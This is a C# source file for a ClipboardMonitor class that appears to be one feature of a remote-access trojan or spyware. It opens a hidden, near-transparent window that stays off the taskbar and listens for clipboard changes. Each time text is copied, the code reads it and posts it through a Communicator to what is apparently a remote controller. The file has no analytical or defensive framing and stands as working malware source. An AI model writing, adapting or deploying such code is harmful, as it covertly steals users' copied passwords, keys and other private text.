using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using True.Core;

namespace True.Features
{
    public static class ClipboardMonitor
    {
        private static HiddenClipboardForm form;

        private static bool isRunning = false;

        public static void Start()
        {
            if (isRunning) return;

            isRunning = true;

            Thread thread = new Thread(() =>
            {
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);

                form = new HiddenClipboardForm();

                while (!form.IsHandleCreated)
                {
                    Thread.Sleep(50);
                }

                Application.Run(form);
            });

            thread.SetApartmentState(ApartmentState.STA);
            thread.IsBackground = true;
            thread.Start();

            Logger.Info("Clipboard", "Clipboard monitoring started.");
        }



        public static void Stop()
        {
            if (form != null && form.IsHandleCreated)
            {
                form.Invoke(new Action(() =>
                {
                    Logger.Info("Clipboard", "Stopping clipboard monitor.");
                    form.Close();
                    form.Dispose();
                }));

                form = null;
                isRunning = false;
            }
        }



        private class HiddenClipboardForm : Form
        {
            private const int WM_CLIPBOARDUPDATE = 0x031D;

            public HiddenClipboardForm()
            {
                Logger.Info("Clipboard", "Initializing hidden clipboard form.");

                this.FormBorderStyle = FormBorderStyle.None;
                this.WindowState = FormWindowState.Minimized;
                this.ShowInTaskbar = false;
                this.Opacity = 0.01; // Make slightly visible to receive messages
                this.Load += (s, e) => this.Hide(); // Hide after form loads

                NativeMethods.AddClipboardFormatListener(this.Handle);
            }

            protected override void WndProc(ref Message m)
            {
                if (m.Msg == WM_CLIPBOARDUPDATE)
                {
                    Logger.Info("Clipboard", "Clipboard changed event received.");
                    OnClipboardChanged();
                }

                base.WndProc(ref m);
            }

            private void OnClipboardChanged()
            {
                try
                {
                    if (Clipboard.ContainsText())
                    {
                        Logger.Debug("Clipboard", "Clipboard contains text.");
                        string text = Clipboard.GetText();
                        Logger.Info("Clipboard", $"Copied text length: {text.Length}");

                        // Send clipboard content asynchronously
                        _ = Task.Run(async () =>
                        {
                            try
                            {
                                await Communicator.PostResponse("clipboard", text);
                                Logger.Info("Clipboard", "Clipboard data sent successfully.");
                            }
                            catch (Exception ex)
                            {
                                Logger.Error("Clipboard", $"Error sending clipboard data: {ex.Message}");
                            }
                        });
                    }
                    else
                    {
                        Logger.Warn("Clipboard", "Clipboard does not contain text.");
                    }
                }
                catch (Exception ex)
                {
                    Logger.Error("Clipboard", $"Failed to read clipboard: {ex.Message}");
                }
            }

            protected override void OnFormClosing(FormClosingEventArgs e)
            {
                Logger.Info("Clipboard", "Clipboard monitor form closing.");
                NativeMethods.RemoveClipboardFormatListener(this.Handle);
                base.OnFormClosing(e);
            }
        }

        private static class NativeMethods
        {
            [DllImport("user32.dll", SetLastError = true)]
            public static extern bool AddClipboardFormatListener(IntPtr hwnd);

            [DllImport("user32.dll", SetLastError = true)]
            public static extern bool RemoveClipboardFormatListener(IntPtr hwnd);
        }
    }
}
